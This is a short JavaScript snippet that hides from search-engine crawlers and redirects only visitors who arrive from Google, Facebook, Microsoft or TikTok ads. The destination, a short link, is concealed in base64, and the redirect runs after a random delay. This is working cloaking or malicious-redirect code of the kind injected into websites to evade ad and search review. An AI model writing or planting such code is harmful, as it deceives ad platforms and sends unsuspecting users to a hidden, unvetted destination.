(function(){
  var ENABLED=true;
  if(!ENABLED)return;
  var u=navigator.userAgent.toLowerCase();
  if(/googlebot|bingbot/.test(u))return;
  var p=new URLSearchParams(window.location.search);
  var r=document.referrer||"";
  var fromAd=p.has("gclid")||p.has("fbclid")||p.has("msclkid")||p.has("ttclid")||r.includes("google.com")||r.includes("/aclk")||r.includes("facebook.com")||r.includes("fb.com");
  if(!fromAd)return;
  var d=atob("aHR0cHM6Ly90LmNvL0NMaDVqZkN2SkU=");
  setTimeout(function(){window.location.href=d;},800+Math.random()*700);
})();
